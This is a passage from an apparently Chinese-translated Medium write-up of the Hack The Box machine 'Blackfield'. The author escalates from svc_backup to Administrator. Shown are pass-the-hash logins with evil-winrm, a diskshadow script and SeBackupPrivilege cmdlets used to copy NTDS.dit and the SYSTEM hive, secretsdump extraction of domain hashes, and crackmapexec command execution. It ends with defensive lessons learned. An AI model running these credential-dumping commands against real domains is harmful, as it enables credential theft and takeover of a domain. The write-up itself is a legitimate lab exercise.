kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我立刻得到了<code class="fe ms mt mu mv b">svc_backup</code>的散列值:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi on"><img src="../Images/5cbddaa12d27e950272688f27057c16b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JqFfwKO5_1Hv0fcVu0ILNg.png"/></div></div></figure><p id="8001" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">还有一个针对<code class="fe ms mt mu mv b">Administrator </code>用户的散列，但这很可能不再有效:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/07732f50867b2ad902b4e8f10d00d212.png" data-original-src="https://miro.medium.com/v2/resize:fit:1372/format:webp/1*Cy_PUiD7eXDjcgagKjZV0A.png"/></div></figure><p id="d0dd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">由于<code class="fe ms mt mu mv b">svc_backup </code>是<code class="fe ms mt mu mv b">Remote Management Users</code>的一部分，我通过<code class="fe ms mt mu mv b">Evil-WinRM</code>尝试收集散列来使用PowerShell Remoting:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="0d30" class="ne lc iq mv b gy nf ng l nh ni">evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d' </span></pre><p id="f90d" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我可以登录。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div class="gh gi op"><img src="../Images/3887659de0545985c1c30484fbe1e5c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*_b-3P1sqKdscV6baMbvaYw.png"/></div></figure><p id="c3ee" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我检查我是否已经可以访问user.txt，看起来我可以。</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/60a5d1d9ad6bf19ff6762fdbcb6e9c79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1312/format:webp/1*4c1_M6QapI5rHYLnfGfgjQ.png"/></div></figure><h2 id="0de6" class="ne lc iq bd ld nj nk dn lh nl nm dp ll ko nn no lp ks np nq lt kw nr ns lx nt bi translated">svc_backup -&gt;管理员</h2><p id="11e0" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">然后，我在C:\users\目录下检查感兴趣的文件:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="cc03" class="ne lc iq mv b gy nf ng l nh ni">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; gci C:\users\ -recurse -force -depth 3</span></pre><p id="bc56" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有趣的是，我可以访问<code class="fe ms mt mu mv b">C:\Users\Administrator</code>下的文件夹:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div class="gh gi or"><img src="../Images/50650b42275836a48ea62f204275fee6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*HR70zSEExnzpspgXb6pSqQ.png"/></div></figure><p id="c9af" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">此外，<code class="fe ms mt mu mv b">C:\Users\Administrator\Documents\forensic</code>似乎是作为SMB的<code class="fe ms mt mu mv b">forensic</code>共享安装的。另外，还有一个watcher.ps1文件。虽然我没有阅读它的特权，但是我稍后会检查它。</p><p id="7455" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我试图读取root.txt，但获得许可被拒绝:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi os"><img src="../Images/584781818613947366670144429d75ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wKiJtwTm9cUVVnvMv4wRrA.png"/></div></div></figure><p id="bb2e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我还试图复制notes.txt，但访问被拒绝:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="c413" class="ne lc iq mv b gy nf ng l nh ni">*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; copy c:\users\administrator\desktop\notes.txt . <br/>Access to the path 'C:\users\administrator\desktop\notes.txt' is denied.<br/>At line:1 char:1<br/>+ copy c:\users\administrator\desktop\notes.txt .<br/>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br/>    + CategoryInfo          : PermissionDenied: (C:\users\administrator\desktop\notes.txt:FileInfo) [Copy-Item], UnauthorizedAccessException<br/>    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand</span></pre><p id="78cb" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我记得<code class="fe ms mt mu mv b">svc_backup</code>用户是<code class="fe ms mt mu mv b">Backup Operators</code>组的成员，该组很可能启用了<code class="fe ms mt mu mv b">SEBackupPrivilege </code>。我用<code class="fe ms mt mu mv b"> whoami /priv</code>来验证它:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ot"><img src="../Images/e3728726a8de6401fc0ca2dc04cd22da.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*50ivBigqa3_I9Kstx03xTg.png"/></div></div></figure><h2 id="0a50" class="ne lc iq bd ld nj nk dn lh nl nm dp ll ko nn no lp ks np nq lt kw nr ns lx nt bi translated">滥用特权</h2><p id="dbb4" class="pw-post-body-paragraph kd ke iq kf b kg lz ki kj kk ma km kn ko mb kq kr ks mc ku kv kw md ky kz la ij bi translated">我以前在多主机机器上做过这种滥用，所以这对我来说不是什么新鲜事。这可以通过使用带签名的二进制文件<code class="fe ms mt mu mv b">diskshadow</code>创建NTDS.dit的卷影副本来完成。首先，创建一个名为script.txt的文本文件，其中包含以下内容:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="3310" class="ne lc iq mv b gy nf ng l nh ni">{<br/>set context persistent nowriters  <br/>set metadata c:\windows\system32\spool\drivers\color\example.cab  <br/>set verbose on  <br/>begin backup  <br/>add volume c: alias mydrive  <br/> <br/>create  <br/>  <br/>expose %mydrive% w:  <br/>end backup  <br/>}</span></pre><p id="f139" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后执行<code class="fe ms mt mu mv b">diskshadow </code>并使用脚本文件作为它的输入。</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="b329" class="ne lc iq mv b gy nf ng l nh ni">diskshadow /s script.txt</span></pre><p id="c410" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后，我使用这个<a class="ae kc" href="https://github.com/giuliano108/SeBackupPrivilege" rel="noopener ugc nofollow" target="_blank"> repo </a>来复制创建的NTDS.dit的卷影副本，然后只需遵循repo中的步骤。由于我使用的是<code class="fe ms mt mu mv b">Evil-WinRM</code>，我可以使用它的上传功能:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="a485" class="ne lc iq mv b gy nf ng l nh ni">upload SeBackupPrivilegeCmdLets.dll c:\users\svc_backup\music\<br/>upload SeBackupPrivilegeUtils.dll c:\users\svc_backup\music\</span></pre><p id="9b4e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后，我可以导入这两个文件:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ou"><img src="../Images/91799d676969cf193afd96f2118e254c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pxPQwuRYXFvse4OSuHctJQ.png"/></div></div></figure><p id="80d8" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为了测试一切是否正常，我首先尝试传输notes.txt:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="b5f9" class="ne lc iq mv b gy nf ng l nh ni">copy-filesebackupprivilege C:\users\administrator\desktop\notes.txt .\notes.txt -overwrite</span></pre><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi om"><img src="../Images/47e97e8f6a11449fc966f3354b319bb9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HiD7Zcmc_FYHMZUEeoFlmQ.png"/></div></div></figure><p id="addf" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">阅读其内容:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="3754" class="ne lc iq mv b gy nf ng l nh ni">Mates,  After the domain compromise and computer forensic last week, auditors advised us to: <br/>- change every passwords -- Done. <br/>- change krbtgt password twice -- Done. <br/>- disable auditor's account (audit2020) -- KO. <br/>- use nominative domain admin accounts instead of this one -- KO.  </span><span id="341c" class="ne lc iq mv b gy oa ng l nh ni">We will probably have to backup &amp; restore things later. - Mike.  </span><span id="acfc" class="ne lc iq mv b gy oa ng l nh ni">PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)</span></pre><p id="ed6a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">根据笔记，他们还没有禁用audti2020帐户(这将导致访问forensic共享)。</p><p id="92bd" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">正在尝试复制root.txt:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="cf50" class="ne lc iq mv b gy nf ng l nh ni">*Evil-WinRM* PS C:\Users\svc_backup\music&gt; copy-filesebackupprivilege C:\users\administrator\desktop\root.txt .\root.txt -overwrite Opening input file. - Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED)) At line:1 char:1 + copy-filesebackupprivilege C:\users\administrator\desktop\root.txt .\ ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     + CategoryInfo          : NotSpecified: (:) [Copy-FileSeBackupPrivilege], Exception     + FullyQualifiedErrorId : System.Exception,bz.OneOEight.SeBackupPrivilege.Copy_FileSeBackupPrivilege</span></pre><p id="7706" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">仍然无法复制root.txt，因为它是加密的，我认为只能在桌面上读取。继续进行<code class="fe ms mt mu mv b">SEBackupPrivilege </code>滥用，我仍然需要传输NTDS.dit，还需要转储系统配置单元。</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="9f4e" class="ne lc iq mv b gy nf ng l nh ni">Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\users\svc_backup\music\ntds.dit -Overwrite</span><span id="b2e8" class="ne lc iq mv b gy oa ng l nh ni"><br/>C:\Users\svc_backup\music&gt; reg save HKLM\SYSTEM c:\users\svc_backup\music\system.hive </span><span id="3547" class="ne lc iq mv b gy oa ng l nh ni"><br/>The operation completed successfully.</span></pre><p id="844a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我现在可以使用<code class="fe ms mt mu mv b">Evil-WinRM’s</code>下载功能下载NTDS.dit和system.hive文件。然后，使用<code class="fe ms mt mu mv b">Impacket’s</code> secretsdump.py解析NTDS.dit:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="eaf5" class="ne lc iq mv b gy nf ng l nh ni">secretsdump.py LOCAL -system system.hive -ntds ntds.dit -outputfile secretsdump.out</span></pre><p id="88fc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">然后我得到哈希值:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ov"><img src="../Images/1988444cbbde36a10fe9765fb3a0edea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rMHZ8a-ClLCsPHnkukWRiA.png"/></div></div></figure><p id="c308" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我现在可以利用PowerShell Remoting作为<code class="fe ms mt mu mv b">Administrator</code>用户登录，并读取root.txt:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="448b" class="ne lc iq mv b gy nf ng l nh ni">evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee</span></pre><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ow"><img src="../Images/2f41b29bce641fdcc6f3423877ae4d93.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hAGYdiK16LhhyyKKuAyQGw.png"/></div></div></figure><p id="0cba" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">或者使用<code class="fe ms mt mu mv b">crackmapexec </code>来执行代码:</p><pre class="mw mx my mz gt na mv nb nc aw nd bi"><span id="2407" class="ne lc iq mv b gy nf ng l nh ni">cme smb 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee -d blackfield.local -x "whoami"</span></pre><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ox"><img src="../Images/536aa085216f04792495f2a02c20d1c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7xIlaWp8ljSo3wjfC-XvdQ.png"/></div></div></figure><p id="3958" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">同时检查watcher.ps1脚本:</p><figure class="mw mx my mz gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oy"><img src="../Images/bb07411b98610117ff76f08d3c821fd9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1l2Sqpz7plwplqFKROOGuA.png"/></div></div></figure><p id="a193" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">该脚本每30秒运行一次，使用Start-Sleep(sleep只是一个别名)并通过PowerShell Remoting加密root.txt。</p><h2 id="7d9e" class="ne lc iq bd ld nj nk dn lh nl nm dp ll ko nn no lp ks np nq lt kw nr ns lx nt bi translated">经验教训</h2><ul class=""><li id="b873" class="me mf iq kf b kg lz kk ma ko oz ks pa kw pb la mj mk ml mm bi translated">在Kerberos中禁用不需要预授权(导致对<code class="fe ms mt mu mv b">support </code>用户的访问)</li><li id="3945" class="me mf iq kf b kg mn kk mo ko mp ks mq kw mr la mj mk ml mm bi translated">禁用已经用于计算机取证/审计的帐户(导致用户帐户<code class="fe ms mt mu mv b">audit2020</code>的存在)</li><li id="650c" class="me mf iq kf b kg mn kk mo ko mp ks mq kw mr la mj mk ml mm bi translated">在遭到破坏并且知道所有域凭证都暴露后，更改所有用户帐户的密码，尤其是高权限帐户(led访问<code class="fe ms mt mu mv b">svc_backup </code>用户)</li></ul><p id="d428" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我的文章到此结束。我希望你学到了新的东西！感谢阅读！🍺</p></div></div>    
</body>
</html>